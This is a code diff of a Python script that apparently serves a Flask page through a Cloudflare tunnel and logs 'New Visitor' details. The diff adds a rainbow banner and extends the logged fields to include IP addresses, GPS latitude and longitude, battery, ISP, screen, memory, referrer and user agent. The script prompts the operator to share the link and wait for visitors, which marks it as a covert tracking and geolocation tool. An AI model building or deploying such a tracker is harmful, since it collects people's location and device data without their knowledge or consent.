@@ -1,21 +1,40 @@
- #!/usr/bin/env python3
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# -*- StartTestFool | Qusoor -*-
+# -*- StartZweb | Qusoor | Rainbow -*-
 import os, sys, time, threading, subprocess, socket, re, shutil, json
 from datetime import datetime
 
-os.system("clear")
-print("\033[92m")
-print("  ____  _             _   _____         _   _____           _")
-print(" / ___|| |_ __ _ _ __| |_|_   _|__  ___| |_|  ___|__   ___ | |")
-print(" \\___ \\| __/ _` | '__| __| | |/ _ \\/ __| __| |_ / _ \\ / _ \\| |")
-print("  ___) | || (_| | |  | |_  | |  __/\\__ \\ |_|  _| (_) | (_) | |")
-print(" |____/ \\__\\__,_|_|   \\__| |_|\\___||___/\\__|_|  \\___/ \\___/|_|")
-print("\033[0m")
-print("       Terminal Web Panel  |  Cloudflare Tunnel  |  Qusoor")
-print("=" * 65)
+RAINBOW = ["\033[91m","\033[93m","\033[92m","\033[96m","\033[94m","\033[95m"]
+RESET = "\033[0m"
+BOLD = "\033[1m"
 
-# تثبيت المكتبات
+def rainbow(txt, offset=0):
+    out = ""
+    i = offset
+    for ch in txt:
+        if ch.strip():
+            out += RAINBOW[i % len(RAINBOW)] + ch
+            i += 1
+        else:
+            out += ch
+    return out + RESET
+
+os.system("clear")
+banner = [
+"  ____  _             _   _____         _   _____           _",
+" / ___|| |_ __ _ _ __| |_|_   _|__  ___| |_|  ___|__   ___ | |",
+" \\___ \\| __/ _` | '__| __| | |/ _ \\/ __| __| |_ / _ \\ / _ \\| |",
+"  ___) | || (_| | |  | |_  | |  __/\\__ \\ |_|  _| (_) | (_) | |",
+" |____/ \\__\\__,_|_|   \\__| |_|\\___||___/\\__|_|  \\___/ \\___/|_|",
+]
+off = 0
+for line in banner:
+    print(BOLD + rainbow(line, off))
+    off += 3
+print(rainbow("       StartZweb  |  Terminal Web Panel  |  Cloudflare Tunnel", off))
+print(rainbow("                    Developed for Qusoor", off + 5))
+print("=" * 70)
+
 print("\033[93m[*] Installing requirements...\033[0m")
 for pkg in ["flask", "flask-cors", "requests", "colorama"]:
     subprocess.run([sys.executable, "-m", "pip", "install", "--quiet",
@@ -33,7 +52,6 @@ HOME = os.path.expanduser("~")
 CF = os.path.join(HOME, ".local", "bin", "cloudflared")
 
 app = Flask(__name__)
-# CORS مفتوح تماماً لكل النطاقات
 CORS(app, resources={r"/*": {"origins": "*"}},
      supports_credentials=False,
      allow_headers=["Content-Type", "ngrok-skip-browser-warning", "*"],
@@ -62,26 +80,33 @@ def get_router_ip():
     except: pass
     return "N/A"
 
-print(Fore.YELLOW + f"[*] Local IP:  {get_local_ip()}")
-print(Fore.YELLOW + f"[*] Public IP: {get_public_ip()}")
-print(Fore.YELLOW + f"[*] Router IP: {get_router_ip()}")
-print(Fore.CYAN + "=" * 65)
+print("\033[93m" + f"[*] Local IP:  {get_local_ip()}")
+print("\033[93m" + f"[*] Public IP: {get_public_ip()}")
+print("\033[93m" + f"[*] Router IP: {get_router_ip()}")
+print("\033[96m" + "=" * 70)
 
 def print_visitor(d):
-    print(Fore.GREEN + "┌" + "─" * 60)
+    print(Fore.GREEN + "┌" + "─" * 62)
     print(Fore.GREEN + f"│ New Visitor @ {datetime.now().strftime('%H:%M:%S')}")
-    print(Fore.GREEN + "├" + "─" * 60)
-    print(Fore.WHITE + f"│ IP:         {d.get('ip','N/A')}")
-    print(Fore.WHITE + f"│ Battery:    {d.get('battery','N/A')}")
-    print(Fore.WHITE + f"│ Latitude:   {d.get('latitude','N/A')}")
-    print(Fore.WHITE + f"│ Country:    {d.get('country','N/A')}")
-    print(Fore.WHITE + f"│ City:       {d.get('city','N/A')}")
-    print(Fore.WHITE + f"│ Public ip:  {d.get('public_ip','N/A')}")
-    print(Fore.WHITE + f"│ Router Ip:  {d.get('router_ip','N/A')}")
-    print(Fore.WHITE + f"│ Timezone:   {d.get('timezone','N/A')}")
-    print(Fore.WHITE + f"│ Language:   {d.get('language','N/A')}")
-    print(Fore.WHITE + f"│ Platform:   {d.get('platform','N/A')}")
-    print(Fore.GREEN + "└" + "─" * 60)
+    print(Fore.GREEN + "├" + "─" * 62)
+    print(Fore.WHITE + f"│ ip = {d.get('ip','N/A')}")
+    print(Fore.WHITE + f"│ public_ip = {d.get('public_ip','N/A')}")
+    print(Fore.WHITE + f"│ router_ip = {d.get('router_ip','N/A')}")
+    print(Fore.WHITE + f"│ battery = {d.get('battery','N/A')}")
+    print(Fore.WHITE + f"│ latitude = {d.get('latitude','N/A')}")
+    print(Fore.WHITE + f"│ longitude = {d.get('longitude','N/A')}")
+    print(Fore.WHITE + f"│ country = {d.get('country','N/A')}")
+    print(Fore.WHITE + f"│ city = {d.get('city','N/A')}")
+    print(Fore.WHITE + f"│ timezone = {d.get('timezone','N/A')}")
+    print(Fore.WHITE + f"│ language = {d.get('language','N/A')}")
+    print(Fore.WHITE + f"│ platform = {d.get('platform','N/A')}")
+    print(Fore.WHITE + f"│ screen = {d.get('screen','N/A')}")
+    print(Fore.WHITE + f"│ cores = {d.get('cores','N/A')}")
+    print(Fore.WHITE + f"│ memory = {d.get('memory','N/A')}")
+    print(Fore.WHITE + f"│ isp = {d.get('isp','N/A')}")
+    print(Fore.WHITE + f"│ referrer = {d.get('referrer','N/A')}")
+    print(Fore.WHITE + f"│ user_agent = {d.get('ua','N/A')}")
+    print(Fore.GREEN + "└" + "─" * 62)
 
 def watcher():
     done = set()
@@ -102,7 +127,6 @@ def watcher():
             done.add(vid)
         time.sleep(1)
 
-# ---------- صفحة HTML أنيقة (بدون إيموجي) ----------
 HTML = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -285,9 +309,9 @@ def start_tunnel(bin):
         m = re.search(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', line)
         if m: url = m.group(0); break
     if url:
-        print(Fore.GREEN + Style.BRIGHT + "\n" + "=" * 65)
-        print(Fore.GREEN + f"[+] PUBLIC URL: {url}")
-        print(Fore.GREEN + "=" * 65)
+        print(Fore.GREEN + Style.BRIGHT + "\n" + "=" * 70)
+        print(rainbow(f"[+] PUBLIC URL: {url}"))
+        print(Fore.GREEN + "=" * 70)
         print(Fore.YELLOW + "[*] Share this link. Waiting for visitors...\n")
     else:
         print(Fore.RED + "[!] No public URL.")
